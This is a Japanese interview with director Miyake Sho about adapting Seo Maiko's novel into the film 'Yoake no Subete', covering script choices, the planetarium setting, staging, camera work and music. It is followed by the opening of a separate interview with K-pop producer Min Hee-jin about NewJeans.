三宅：今回は、プロットがある段階になった時やシナリオのいくつかの段階で、瀬尾さんと出版元である水鈴社の篠原さんからコメントをいただくという形でした。企画・プロデュースのホリプロ井上さんから企画開発当初に「プロデュース部もチームとして丁寧に開発していきたい」という思いが伝えられ、井上さんにリードしていただきつつ、脚本の和田さんと僕、チーフプロデューサーのバンダイナムコ西川さんら数名で打ち合わせを重ねていきましたが、世代も立場も違うからこそいろんな角度で充実した検討ができましたし、篠原さんからは「小説と映画は異なるものという前提で」とわざわざ気を遣ってくだった上で、本当に丁寧なコメントを毎回いただいた記憶があります。すべてのやりとりが僕の立場でわかっているわけではないと思いますが、わかる範囲で言えば、個人的に、普段文章を書く仕事のときに編集者の赤入れフェチなので、まさにプロの目によるコメントに密かにテンション上がりつつ、撮影ギリギリまで稿を重ねていくことができました。

また、大きかったのは、（藤沢さん役で主演の）上白石萌音さんの存在ですね。主演であり、もともと原作の大ファンであるという上白石さんが最初に脚本をどう受け止めてくれるかが本当に重要なので、小説にはない要素である諸々について、例えばプラネタリウムの設定、藤沢さんのお母さんとの話、物語のラストの変更などの理由に加え、そもそも小説と映画という表現媒体の違いを自分がどう考えているのかといった根本的なところも含めて手紙に書きまして、その後直接、初めてお会いしました。そこでみっちり話して、さらに脚本がいまの形にブラッシュアップできたので、上白石さんと初めてお会いした日の会話が相当に大きいです。瀬尾さんと直接お会いしたのは、撮影現場にわざわざ足を運んでくださったので、その時が初めてで、次が初号試写の際に感想をお聞きした際ですね。公開前のつい最近も、篠原さん経由で改めて、映画化に関してメッセージをいただきました。内容は言えませんが、とてもありがたいものでした。

中井：原作者とも、それほど良好な関係性を結べているんですね。

三宅：瀬尾さんがnoteの連載でいろいろと書いてくださって、ほんとうに大きな器のなかで仕事をさせてもらえたなと感じています。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：そもそも、個人的には、原作者が内容面でも許諾を与えているのであれば、映像化にあたっての改変は良いのではないかと思っています。小説を映像化するときに、小説のそのままを描くのは不可能だと思うんですよ。そもそも文章と映像は全然違うアートフォームだから、変換するときに必ず違いが発生する。テキストを映像に最適化することによって新しい作品が立ち上がること自体も、ぼくは良いと思っています。そういう観点で、三宅さんは映像でしか描けないものを盛り込んでいくことについて、どう考えていますか。

三宅：小説の映画化に関して考えるポイントは多々ありますが、ふたつ挙げると、ひとつは想像力の違いの問題ですよね。例えば、藤沢さんが（松村北斗演じる）山添くんの髪を切るシーンがあります。そこは小説でも大きなポイントになっていて、瀬尾さんの他の小説でも反復されるモチーフですが、小説を読んでいるときには読者それぞれが想像できるのに対して、映像にするとたったひとつの絵を与えてしまうことになるのが恐ろしいと思っていました。スベったら目も当てられないし、ほんとどうしようかな、とギリギリまで考えてた箇所です。ただ、そもそも俳優はもっと恐ろしいでしょうね、姿も声も自分の演技ひとつに集約させてしまうので。時にはさらっと読めるかもしれないところでも、生身の体があると印象も変わってしまいますし。ふたつ目は、小説の地の文で表現される心の動きは、映画では「目に見えるアクション」を通して「目に見えない心」を想像してもらうしかないので、それをどうするかという問題。アクションといっても大きなものに限らず、ちょっとした仕草などで表現するわけですけど、時間芸術としての映画は、セリフとセリフの間（ま）の提示といい、やっぱり俳優の体から出てくるものが大きい。小説の速度感と、生身の人間が動く速度はどうしても違ってしまう。

中井：確かに、時間という視点で考えると、小説のようなテキストでは読む側が主体になっていく。しかし、映画のような映像だと提示する側が時間を支配していく。映像の提示というのは、ある意味で唯一解なのかもしれないけど、それによって発生する別の新しい面白さがありますね。

三宅：そう思います。それから、「映画でしか描けないもの」という点でいえば、例えばこのポスターで説明すると、フォーカスは主人公たちにありますけれど、ここには木の揺らぎや光のきらめきが人間と等価に同時に存在していますよね。小説はそれを同時に描くことはできません。一行のリニアな文字の連なりの中で、ときに木の梢の揺れを描写できるけど基本的には単線で書くしかないはずなんです。一方映画だと、こうした無数の記号を同時に、物語に回収されない形で存在することを表現できます。今回の題材は、自分の内側のコントロールできない問題と向き合っている人が、自分の外側のコントロールできないさまざまなものにも目を向けていく、という話でもあると解釈したので、それはこうやって言葉で説明するよりも、視覚芸術だからこそ一発で表現できるはずだとは考えていました。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：この映画は原作から改変されているところも面白いなと思って観ていました。例えば、職場の設定が変わっています。金属部品会社から科学教育教材の会社に変更され、移動式プラネタリウムなども扱っています。プラネタリウムは、孤独を表す夜のメタファーでもあるし、暗闇の中で光る星が他の孤独な誰かを支えていく物語と繋がっていく、とても上手い改変だと思いました。三宅さんがプラネタリウムを見たときにこの設定変更を考えたと伺ったのですが、もう少し詳しく教えてください。

三宅：実は、物語の設定をプラネタリウムにするのはどうかなと思ったうえで、検討のためにプラネタリウムに行ったような記憶を最近思い出したんです。プラネタリウムという設定をどうして思いついたかは、説明するのがやや時間がかかるんですけど。あ、でももともと宇宙に個人的に興味があるのと、あと映画でいえば、ニコラス・レイの『理由なき反抗』がどうしてプラネタリムが舞台だったのかはよく考えていました。

中井：そうだったんですね。

三宅：話を戻すと、この物語は「働くこと」についてのお話でもあると考えていたんですね。PMSやパニック障害の症状自体の苦しみもあるし、それが原因で思うように働けない苦しみもある。前者は医療の、後者は社会の問題で、映画で考えられるのは主に後者の一部だと考えました。そこで、映画化では職場の描写がより大事になるはずと思い、小説で書かれた職場の雰囲気を大切にしつつ、もう少し職場の描写を増やしてみたらどうなるだろうと考えました。事務作業の他に、商材や業務を増やしたらどうなるかな、と。小説では栗田金属という会社名ですが、まずは、金属というメタリックで無機質な場だからこそ、この会社独自の関係性が対比的に際立っているのかなと考えて、金属ネジを使うような理系っぽい商材、というところから科学教材があったらどうなるか。科学教材、顕微鏡、レンズ、望遠鏡と連想ゲーム的に広げていきました。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

三宅：で、プラネタリウムを調べました。山口県の宇部市にあるプラネタリウムに足を運ぶ機会があって、そのプラネタリウムで実際に感じた、いろんな悩みが吹き飛ぶような開放感が素晴らしかったんです。プラネタリウムの中にいる時間も面白かったし、外に出て空を見たり風を感じる気持ちよさっていうのが、瀬尾さんの小説の読後感に近かったようにも思います。具体的には、山添くんが自転車に乗って感じている風ですよね。あと、宇部のプラネタリウムの解説員の方の喋りが、落語の名人のように異常に面白くて。プラネタリウムの投影機も、映画の35ミリの映写機を魔改造したような、とんでもなくかっこいい機械だと思いました。そこからさらに調べていくと、移動式プラネタリウムというものが世の中には存在することを初めて知ったんです。プラネタリウムは、都会に住んでいて星空が見えない人のために偽の星空を作って想像させるものですが、移動式プラネタリウムがどうして存在しているかというと、そのプラネタリウムにも足を運べない、たとえば病院から出られない子供たちやお年寄りの方のために機材を持ち込んで投影しています。その活動を知って、かなり心が動揺するというか、感激しまして。小説の中では、山添くんが映画館にいけない代わりとしてサントラCDを家で楽しむという美しい場面があるんですが、その場面は版権がクリアできず残念ながら実現できなかったんです。ただ、「代わりの楽しみを見つける」という重要なモチーフを表現するのに、プラネタリウムという空間ならサントラの「代わり」になるかもしれない、と。そして、小説では最後に、ガレージを開いて地域の人にきてもらおうという展開になるので、それに合わせる形で、イベントを開いて地域の人にきてもらう形はどうだろうというのが自然と見えてきました。ここまでくると、構造は同じと勝手に言い張っても見た目はだいぶ変わってしまうので、小説と映画に違いができてしまうことを映画の中でちゃんと明示した方が良いだろうと思い、社名は金属から科学に変えたいということも含めて、腹を決めて提案させてもらいました。それを寛大に受け止めくださったばかりか、「ロマンチックすぎやしないか」という懸念まで事前に伝えてくださったおかげで、ここは過剰に音楽を流したりCGの星空をきらきらやったりせず、基本は声と顔だけで勝負しようという方針も、ブレずにやれたように思います。

中井：そうだったんですね。あと、プラネタリウムが生み出す、みんなで暗闇の中で光るものを見つめる行為って、まさに映画だなと思いました。そういう意味でも、この作品は主軸で動いてる物語とは違うところで、三宅さんの映画に対する思いが入ってきていると感じています。そのひとつとして、劇中、中学生がビデオを回して栗田科学の社員を撮り続けるじゃないですか。以前、三宅さんにインタビューしたとき「中学生の頃に小さなビデオで短編を撮って、そこから映画に興味を持った」とおっしゃっていたことを思い出しました。そういうご自身の経験とも重なる部分はあるんですか。

三宅：いや、さすがに中学時代の自分とは重ならないかなあ。あんなに真面目じゃなかったから（笑）。でも、自分も中学生で初めて短編映画を作りましたし、好きなものに対して今以上に集中できていたことは自覚しているので、映画の中に出てくる中学生のふたりが熱心にドキュメンタリーを作ってるのは感覚的にわかるつもりです。でも、どちらかというと、いま自分たちがやってる仕事の方が、彼らと重なっていると思います。観た人から「三宅くんの代わりにあそこにいるでしょう」って言ってもらうこともありました。

中井：今、社会的には利己主義が横行し、自分と身内のことだけを重んじておけば、他人に配慮なんかしなくて良いよっていう社会がどんどん押し迫ってきている実感があります。だからこそ、この映画で描かれている、他者に対して何かできることがあるっていう姿勢は、今の時代にとても重要なものを提示してるんじゃないかと思いました。

三宅：ぼくが学生の頃から、新自由主義化における自己責任論の考え方がありましたけど、個人の責任の外側で起きるトラブルなんていくらでもあるので、「いや、ありえないじゃん」って当時から思っていました。何のために行政や国家があるんですかね。経済的にもそうだし、話を広げるようですが、例えば生まれつきの疾病を持っていることなどに関しても、当然その人が悪いはずがない。地震に遭った人や飛行機に乗ってた人が悪いわけがない。自己責任とか、因果応報とか先祖のバチとか、そういう考え方に対して、怒りというより、「くだらねえな」とずっと思っていました。ちょっとでも冷静に考えたら自己責任なわけないってわかると思うんです。だから、振り返ると、国家とか家族とかの既存の共同体とは違う、もうひとつの別のコミュニティばかり撮ってきたように思います。普段あんまりこういうこと口にしてないし、呑気なものかもしれませんが。

中井：それが映画の形になって、自覚的か無自覚かは別としても、何かしら投影されるのではないかとは思います。

あと、この映画のセリフで「北極星すら交代する」っていう言葉がめちゃめちゃ良いなと思って。このセリフの個人的な解釈として「変わらないものはないんだから、自分を追い詰めて過剰に固執する必要はないんじゃないか」というメッセージにも受け止めたんですね。それがこの物語の終盤の意外な展開にも繋がっていく印象を持ちました。

三宅：この映画がもし別の時代に作られていたとしたら、最初はぶつかっていた男女が出会ってどう終わるのかという際に、恋愛を物語上の帰結として使うことはあったと思うんです。しかし、今回はそのように展開しないのが面白いなあと思って作っています。仮に恋愛視点で考えれば、それぞれが離れ離れになるのは悲しいことのように思われてしまうけど、この映画ではそういう感情にはまったくならずに、ふたりそれぞれの人生の選択として観客がごく普通に受け止められるものにしたかった。あとは、もし小説の続きがあったら、このふたりが定年まで栗田科学に勤めることはないだろうって考えてみたんですね。ただ、会社が変わったからといって、このふたりに生まれたものが変わるかというと、そうじゃないはずと思いました。職場や住所といった目に見えるものは常に変化していくけれど、目には見えない、変わらないものがあると思うんです。北極星の位置という目に見えるものが変わっていくけど、目に見えないもので変わらず存在するものを感じられれば良いと思いました。彼らふたりも、これから年老いて姿形も変わっていくけど、心の中にあるものはおそらく変わらないと信じたいので、それを撮るのがぼくの仕事だなと思いました。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：今おっしゃったことと少し重なりますが、ぼくがこの作品で特に良いなと思ったのは、人それぞれの苦しみを安易に恋愛で回収しないことですね。

三宅：ロマンティックな関係を抜きにした友人って、余裕であるんで。あまりにも当たり前に。

中井：そうですね。今まで、映画でもドラマでも、抱えた苦しみを最終的には恋愛で回収していくことが多いけど、実はその物語は多くの人を救えないんじゃないか、と思ってるんですよ。ぼくは恋愛関係って万人のものではなく、基本的に限られた人の間で発生するものだと思っています。でも、物語が恋愛関係性に閉じてしまうと、特殊な状況でしか課題は解決できないという答えに寄ってしまう印象を持ったんです。

三宅：確かに。

中井：だけど、非恋愛的なものであれば、受け取る側からしても持ち合わせている可能性がある。そういう意味で、この作品の最終的な展開は、多くの人を救うんじゃないかと思いました。

三宅：今ふと、念のため言いたくなってきたんですが、一応お伝えすると、ぼく、恋愛映画が大好きなんです。古今東西の、それこそ90年代以降のキャメロンディアスあたりのロマンチックコメディとか。

中井：『普通じゃない』（1997年）とかね。

三宅：そうそう。セックスコメディと言われるものも好きだし、ドリュー・バリモアの映画がほんとに好きで。学生時代まではそのジャンルをちょっとバカにしていましたけど、25歳を超えたぐらいから夢中になりました。ただ、恋愛が描かれる映画でぼくが面白いと思ってるポイントは、カップルがくっつくかどうかというのは正直どうでもいい。赤の他人たちがベッドに入ろうが何しようが、そこはたいした自分の心が動く場所じゃないし、実は意外とその瞬間自体は演出もあんまり気合いが入ってない気がするんですね。そこじゃなくて、その過程にある衝突の瞬間や幸せな瞬間が面白いと思います。このジャンルは、全然違うタイプの人間が出会って、最初は苦手で、でもお互いを知ったり、自分のことも知るような過程が重要なのだと思うし、また、演技も時代に合わせて新しいモードで演じてくれるのも面白いです。失敗を恐れずに相手に飛び込んだり、まんまと失敗したりするのが笑えて泣ける。だから『夜明けのすべて』では、ある意味で、恋愛のないロマンチックコメディというか、それの再解釈、そうしたジャンルの面白いと思う核の部分には影響うけつつ、それ以外の性愛要素は一切なしで撮る、ということだったかもしれません。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：面白い話ですね。あと、この映画で上手いなと思ったのは、藤沢さんと山添くんの関係性を表現する物理的な距離感と立ち位置です。例えば、恋愛関係性を描く際には、基本的な立ち位置って正対するシーンが多いと思います。

三宅：キスするためには正対しなきゃいけないですからね。あとケンカも。

中井：そう。だけど、この映画ではどちらかが相手の方に体を向けてるときは、相手はあまり向き合わない。

三宅：90度ぐらいかもしれない。

中井：つまり、お互いの体の位置関係がずれている、というのが印象的だったんです。席が隣だから横位置にあることも多かったけど、ふたりが長い時間、目を合わせ続けることはあんまりなくて。

三宅：玄関前ぐらいかな。

中井：そうそう。いわゆる恋愛の匂いがする部分を表現上で回避してる。カラッとした気配があって、だけど相手に対する気遣いの気配もあるというのがすごい良かったなと思っていて、そこをどう考えて演出していたんですか。

三宅：まず、恋愛未満みたいに見られたら違う、とは思ってましたね。そもそも、彼らはそんな気持ちがないどころか、実は必要以上に仲良くなろうとすら積極的にはしてない。同僚としてやれることをやろうとしてるだけで、今は楽しい時間だねと自覚もしてない。ただ相手が寒そうだからブランケットを渡すだけで、別の意味や意図はないというか。

中井：ブランケットを渡すシーンは、演出的にだいぶ気遣ってる感じがしましたね。変な意味を持たないような渡し方をしていた。

三宅：「これは変な意味を持ってないんですよ」みたいに渡すと、それはそれで意味が出てしまう。そのあたりはもうお二人が持っているストレートな魅力もあるし、お二人がそれぞれのキャラクターをちゃんとつかまえているから、どう座ろうが立とうが、恋の気配が一切漂わない力強い存在でいてくれました。ぼくの演出プランとして、ふたりは向かい合わずに横並びといった立ち位置のルールは事前にやんわりと持ってましたけど、それがなくてもこの関係性は成立したと思います。

中井：おふたりには、その位置関係の話はされていたんですか？

三宅：「横に座っているだけなんで」という台詞に上白石さんが「好きなセリフです」と反応してくれて、それで説明したような気がします。そこで面白かったのは「これくらいの信頼がお互いにあれば、たとえ横並びじゃなくてもこの関係性は成立しそうですよね」と何気なく話してくれて「確かに！」と。上白石さんの知性というか頭の柔らかさに、ぼくが刺激をもらいました。もしその言葉がなければ、サッカーのフォーメーションでいえば、ガチガチにシステマチックだったかもしれません。でも、その僕のシステムの上で、彼女たちがめちゃめちゃ柔軟なポジショニングをとった上で本当に厳密な芝居をしてくれて、個の力は強いしシステムとしても機能する、みたいな素晴らしいチームになりました。

中井：その補完性がうまくいってるから、劇中に変な固さみたいなものが一切なくて、すごくよかったなと思っています。

気遣う気配という観点では、この作品は2階から誰かを見つめるっていうショットが反復していましたね。相手との距離はあっても気にかけているという作品のテーマと重なる表象だと感じました。

三宅：確かに、上から見守ってる感じはありましたね。そのテーマで言うと、シナリオの文字面では、セリフを言ってる人が前面に立って見えてしまうものですが、でも、この映画はセリフを言っている人の周りも大事なので、シナリオにはうまく書けなくても現場では会話を聞いてる人も撮ろうと事前に思っていました。でも、喋ってる人と聞いてる人を交互に撮ってると撮影の量が増えてしまうんで、それは現場として体力的にしんどい。じゃあ、どうやって聞いてる人も同時に撮るか、見守ってる人を撮るか、というところは、自分の仕事だったかなと思います。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：そういう意味で、この映画は音の映画でもあると思っていたんです。例えば、渋川清彦さん演じる山添くんの元上司が泣くシーンがあります。あのシーンの撮り方は、カメラは山添くんを前から捉えて、彼の話を聞いている元上司の背中が見切れてる。そういう状況だから元上司の表情は映らないけど、元上司のリアクションは、音をきちんと聞いているとわかる。つまり、この映画は耳を傾ける映画でもあると思います。

三宅：そうですね。

中井：このふと耳を傾ける行為そのものが、相手に対して気遣うことに繋がっています。劇中、PMSになるかならないかは相手を注意深く見ていればわかる、という話もありましたけど、周囲の人たちが気にしていれば気づくことがあるという点では、音の中に見えないものが込められている印象を持ちました。

三宅：普段お喋りしているとき、たとえば友達と話している場合、喫茶店で向かいに座ってお喋りできる内容と、夜に遊歩道で顔を見合わせずに相手の声だけ聞きながらお喋りするのでは、出てくる言葉が変わるというのは実感としてあります。道徳の授業の「耳を傾けましょう」みたいなことではなくて、もっと単純に、隣で一緒に歩いてたら相手の話もよく入ってくるし喋ることができるよねという、ふだんの身体感覚がベースにあります。

中井：ぼくはこの作品を試写室で観たんですけど、聞こえてくるものを聞くという行為が劇場空間と相性良いなと思いました。家で暮らしているとそれだけでノイズが多いけど、映画館だと、きちんと聞くべき音が聞こえます。

三宅：そうですね。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：俳優についてももう少し聞かせてください。前作『ケイコ 目を澄ませて』で三浦友和さんが演じたボクシングジムの会長のように、何かを抱えた人を見守る人の存在が今回も反復して登場しています。具体的には、光石研さん演じる栗田科学の社長がその立ち位置です。前作のときは、会長自身が抱える経営や健康の問題がありつつも、教え子であるケイコを優しく見守るという構図でした。今回も社長は、弟を亡くした心の傷を長年抱えた上で、社員である藤沢さんと山添くんを見守っています。その意味でも、見守る人の存在が三宅さんの近作の中ではシグネチャのようになっていると感じています。

三宅：作品を跨ぐ形でキャラクターを捉えているわけではないですが、今回で言えば、光石さんが演じた社長は、最初から見守りたくて見守っているわけじゃないんですね。自身の経験として、弟を見守り損ねたという大きな後悔と悲しみがあります。これは、具体的には言いませんが、ぼく自身の実人生においても自分が見守らなかったせいで起きてしまったと思っている大きな後悔があるし、そういう苦しい思いを拭えずにいる人は、この日本には多くいますよね、本当に悲しいことに。だから、誰かを見守りたいとか、優しくしようとかいうのが先行してあるのではなくて、自分はかつて見守れなかったという取り返しのつかなさが、映画の中や実人生で、これからはどうしたいか、という思いと繋がっていく感覚です。だから、「優しい世界ですね」と言われるとほんのちょっと微妙な気持ちになりますね。優しいやつほど怖いというのはヤクザ映画で見たことありますし。だから、この映画の職場は、あくまで僕の言い方だと、優しいというよりむしろDFやボランチみたいに周囲を厳密にみている人たちを見事な集中力で演じた俳優たちが映っている場で、その前提として、世界の残酷さがベースにあって、でもその悲惨をわざわざお金をかけて再現するなんてなんか違うというか、その後をどうするかという世界を新たにつくって撮ることに、フィクションの意義があると思って撮りました。

中井：その意味で、先ほど話した渋川さん演じる元上司が泣くシーンも、どうして泣くのかという理由がよくわかるんですよね。自分に向けた悔恨を抱えた人間が少しでも救われる瞬間って、他者を救おうとすることによってのみ、生まれるんじゃないかと思うんです。

三宅：そうですね。一度失敗しているからこそ、二度目は何とかしたい、という物語だと思うんですよね。自分がこういう映画を作っていること自体もそうかもしれないです。

中井：ぼくはこの作品が主演ふたりの話ではあると思いつつ、群像劇的な要素も多い印象があります。特に栗田科学で働く同僚たちがめっちゃ良いなと思っています。

三宅：めっちゃ良いですよね。

中井：主人公ふたりに対して絶妙に優しい距離感で、主演ふたりの存在が際立つのは栗田科学の人たちがいたからだと思っています。演出面におけるキャラクター設計と動きをどのように考えていましたか。

三宅：これはキャスティングが大きいですね。山添くんのセリフに寄せて言うと、「地味で、こうはなりたくない」という雰囲気がまず必要でした。でも、その先入観が途中から良い形で裏切られ、彼らがとても素敵でプロフェッショナルな人たちである、という事実がわかっていく。この変化を達成するには、大変失礼な言い方ですけれど、まず最初に一見した時の雰囲気で、ある印象を思わせられなければならない。なんて言えばいいです？

中井：つまり、派手すぎない、ということですね。

三宅：そうです、うまい言い方をありがとうございます。オーディションをして、いい出会いがありまして。みなさん、本当にこの映画の核心をがっちり掴んでくれて、とても良い距離感であの場にいてくださったので、ぼくは彼らベテランの技術に相当に甘えながら、ふたりと同時にみなさんの芝居を一緒に作っていくっていう形でした。同時に6、7人を演出するのは疲れましたけど、めちゃ楽しかったですね。全カットにわたってずっと複数人が出てくる異常に多層的な映画を作ってみたくなった。

中井：カメラ位置の考え方について教えてください。主演の松村さんと上白石さんにも、あまりカメラが寄りませんでした。

三宅：まず、藤沢さんも山添くんも、それぞれひとりでいる時間があります。それらの場面では、観客もごく自然と顔を見ようとしますからそこで顔は見えてくるし、位置と照明がよければ、必要以上に寄らなくても観客は脳内で補完するものだと実感として思います。映画を観ていて、自分の脳内では首から上の寄り画の記憶があるけど、観直したら実は胸や腰から写ってた、ということがありますよね。それが美しいクロースアップというか、理想的なバストショットだと考えています。その辺りは月永さんの厳密な仕事のおかげです。

藤沢さんと山添くんがふたりでいるときは、同時に撮りたかったんです。それぞれをバラバラに撮って繋ぐと、編集で間合いなども調整できますが、そうする必要がない、そういう邪魔をしてはいけないと思うような、見事な美しいリズムが現場で生まれました。また、劇中、社員がいる空間で、観客もふたりを同時に見るという経験が面白いんじゃないかと思いました。会社にいる人たちも、ふたりのうちのどちらかを寄りで見てるわけではなく、距離をとって同時に見ているわけで。

中井：この映画は、切り返し（それぞれが単独で映っているショットの連続）を使うことなく、ふたりが収まっているショットの中で時間が経過していくのを観客が見つめる構図でしたね。切り返しを撮らないという意図は、松村さんと上白石さんにはどういう話をされたのでしょうか。

三宅：そのやり方は、撮っていく中で見つけたんですよ。

中井：では、最初は切り返しも撮っていたんですか。

三宅：いや、ふたりの出会いのシーンまでには、この映画の撮り方を見つけちゃったので。切り返しも撮るプランも立てていたけど、結局撮らなかったということですね。ただ、ふたりとも、他の現場のやり方とは違うことに当然気づくので、先に意図を説明しました。撮りたいものは、ふたりの時間丸ごとだ、という話を簡単にですけどね。ふたりとも、ぼくが言わなくても自然とその場の居方を感じてくれていたように思ったので、必要以上には言っていません。ただ、カット数が少なくなると芝居できる回数自体が少なくなるというのがメリットになり時にデメリットにもなり、「もっと（演技を）やりたいからカットを割ってほしい」と言われましたけどね（笑）。それは（前作の撮影時に）岸井さん（ケイコ役の岸井ゆきの）にも言われました。

中井：ということは、今回は結構、早撮りだったということですか？

三宅：いや、どうですかね。テストに時間がかかるのと、テイクは重ねたので。

中井：でも、16ミリのフィルム撮影じゃないですか。

三宅：もちろんデジタルほどはできないけど、前作の『ケイコ 目を澄ませて』ほど制限もせずに、前回のざっと3倍ぐらいはカメラを回してましたかね。

中井：そうなると、俳優のフィジカルの問題も出てきますね。

三宅：そうですね。今回は芝居が乱れる感じも撮ってみたかったんで、テイク1で上手くいっていても、テイク2や3で違うことを試してみて、それで何か面白いものがあればいいなということも試しました。平均はテイク4くらいだったと思います。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：劇伴についても聞きたいのですが、曲数も限りなく少なく、使い方もリフレインしています。これはどういう意図だったのでしょうか。

三宅：結果的にですね。はじめから極端に制限したわけではなくて、今回曲数多くなるかも、なんて最初のころは話をしていた記憶もあります。劇伴を担当したHi’Specとは4回目の仕事でしたし、彼が天才なのはわかっていたので、音楽は彼のものという感覚でやってもらいました。彼はシナリオも映像もみてない段階で、僕が簡単に口頭で物語と狙いを説明しただけで、今のメインテーマの基本になるものを「どうですか」と送ってきてくれて、「これだわ。どういうこと？」みたいな。そのあと、編集と並行して映像も共有しつつ、詰めていくなかで、キーワードも出てきましたかね。

ひとつは、波です。先ほどリフレインとおっしゃいましたが、同じように繰り返しがあるけれど、実はその都度、違うことが起きている、みたいな。ヒップホップのビートも基本的にはループですけど、そこにラップがのることで変化して聞こえるから延々と聞くことができますよね。Hi’Specが自分のジャンルでやってきていることですけど、ただの繰り返しではない波、変化する波っていうのがこのふたりの物語とマッチするだろうなと思いました。今回はサンプリングじゃなくて基本弾いてましたね。途中で一緒にキーボード買いに行ったりして。鍵盤足りない、みたいな。

あと、新しい感覚だったのは、音って普通は、鳴るとそこに新たに生まれるものとして捉えると思うんですが、でも今回は、ひとことで言えば「幽霊」、聞こえる前から元々そこにあった音、というのが途中からキーワードになりました。音楽を聴いているとき、これはイヤホンだとわからないことですけど、まともなスピーカーで聞いているときに、たとえばピアノが曲の途中から入ってくると、「あ、ピアノさんそこにずっといたんだ」みたいな感覚があると思うんですね。突然現れたわけじゃないというか、音が足されてる感じじゃなくて。ずっとそこにいて、たまたま弾いてなかっただけ。ピアノがあってピアニストもいてピアニストの息遣いも最初からあったという空気感。そういう音の鳴り方がしたらいいねえ、とミックスの最後の方に話していた記憶があります。多分、映画館だと、その辺りがわかってもらえるかなと思います。

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

中井：最後になりますが、以前、三宅さんにご自身の作品選びの基準を伺った際、「答えがなさそうな問いを見つけたときに自分ならどう考えられるのかが、映画を撮るモチベーションになっている」とおっしゃっていました。この答えがない問いにじっくり対峙する行為は、現代社会の中で重視されつつあるネガティブ・ケイパビリティだと感じます。映画に挑む際に、この視点を大事に考えているのはなぜなのか、教えてください。

三宅：どれだけ幸せだろうと苦しかろうと、いつか人は死ぬという事実、人生が一度しかないというのは変わらなくて、それが自分の映画づくりの根っこにある気がしています。この社会がどうなったらいいだろうとか、夕飯何食べようとか、生きているといろんな問いと選択をすることになるけれど、それらの問いがすべて、一度きりの人生という大きいお皿の上に載っているという感覚があります。どうせ死ぬという絶望は、適当に忘れなきゃ生きていけないし、でもそれがないと何も決められない気もします。ずっと生きてるなら何でもありになっちゃう。

中井：いずれ誰しも死ぬことは確定しているけれど、そこに向かうプロセスは、答えの出てないものばかりで、その不確定なものを映画で撮りたい、ということでしょうか。

三宅：そうですね。僕は超面倒くさがり屋なので、ただの言い訳というか屁理屈なんですが、どうせ死ぬけどでもやるぞと思えるような理由づけがないと、基本的にはなんにもせずに寝てたいんです。でも放っておくとあらゆる物事は基本的に悪くなるはずなんで、悪くなってから面倒くさいことをするか、その前に面倒でもやるか、どっちがマシかだと思うんですよね。もうめっちゃ、先やっとけばよかったーって思うことばっかりですけど。それで、生きていく上でのいろんな面倒な問いに対して「こうすると儲かる」とか「これが流行り」とかいろんな答えがありますけど、常に「でも死ぬ」とか「で？」という蓋をすると、また違う答えを探して再検討し続けることになる。まあ、どうせ死ぬのは自分だけじゃなくて好きな相手も超嫌なやつもそうだから、余計なことで削り合うのは虚しいし、どうせ一回しかないんだから、いいことをちゃんとやった方がいいとは思うんですよね。そういうプロセスというか試行錯誤を、ぼくの映画では繰り返しているようにも思います。

前作『ケイコ 目を澄ませて』の取材以来にお会いした三宅唱監督は、以前と変わらない物腰の柔らかさと以前よりもさらに深みを増した知性で、筆者のとっつきにくい質問にも鮮やかに回答していく。そして、映画監督としてはまだまだ若い年代でありながらも、瞬間的にベテランのような落ち着きと胆力を感じさせるのは、作品を重ねるたびに高く積み上がる期待のハードルを乗り越えてきた自負心だと受け取った。この『夜明けのすべて』は、おそらく2024年の日本映画の上位に位置するのは確実であり、次回作への期待はさらに高まった。三宅唱からまだまだ目が離せない。

取材・文・編集：中井圭（映画解説者）

撮影：服部芽生
Title: 『夜明けのすべて』三宅唱監督インタビュー　「見えるものは変化しても、目には見えない変わらないものがある」 - あしたメディア by BIGLOBE

Link: https://realsound.jp/2024/02/post-1574758.html
Content: NewJeansの躍進が止まらない。2022年7月のデビューから約1年半、彼女たちが何かしらのアクションを取る度に大きな話題を呼び、その一挙手一投足から目が離せない状況が続いている。2023年に輝いたアワードやノミネート、日々更新されるレコードを上げ出したらキリがなく、もはやその人気ぶりは説明不要と言っても過言ではないだろう。

そんな彼女たちの活躍を支えるのが、総括プロデューサーのミン・ヒジンだ。S.M.entertainmentからキャリアをスタートした彼女は、デザイン面を受け持つクリエイティブディレクターとしてSHINee、f（x）、EXO、Red Velvetらの制作に携わり、人気グループへと押し上げるのに一役買った。そこからHYBE（当時はBig Hit Entertainment）へ活躍の場を移し、2021年にHYBE傘下の新規レーベルADORを設立。その第一弾としてNewJeansをデビューさせた。

彼女のプロデュースはそのグループやシーンにおける常識の刷新、誰も見たことのない地平への挑戦が感じられる。結果論ではあるが、実際にNewJeansは登場以前と以降でK-POPの潮流を変えてみせた。とはいえ、脈々と支持されてきた大衆文化や歴史を否定するわけではない。それらへのリスペクトを込めながら、様々な時代の音楽や文化を掛け合わせることで新たな作品を生み出し、多くの人々に感動を届けている。

リアルサウンドでは、ミン・ヒジンにメールインタビュー。NewJeansへと至る彼女のルーツから、プロデューサーとしての思考、グループが世界的な人気を獲得するに至った要因などを聞いた。（編集部）

NewJeansを起点にK-POPトレンドの変化を体感

ーーNewJeansはデビュー以降、目覚ましい勢いでグローバルな人気を獲得しています。客観的にはプロジェクトとして素晴らしいスタートを切った1年だったと感じますが、プロデューサーとしてNewJeansのデビュー〜現在までの期間をどのように振り返りますか？

ミン・ヒジン：とても忙しく走ってきましたが、予想して計画した通りにいった安堵感もある一方で、これまでのいろいろな出来事が脳裏に浮かび、万感の思いが交錯します。

ーーデビューから約1年半の活動期間において、一番成功したと感じる点、驚いたことなどがあれば教えてください。

ミン・ヒジン：NewJeansを起点にK-POPトレンドの変化を体感しました。ずいぶん前から創作から事業まで、すべてのプロセスを併せて作業することを望んでいました。20年以上この業界に携わって感じたことですが、エンターテインメント事業はプロデュースと経営が同時に有機的に運営された時、初めて真の花を咲かせることができると思います。したがって音楽と視覚的コンセプトの具現化、マーケティング、事業がすべてひとつに連結され、一糸乱れずに動かなければなりません。

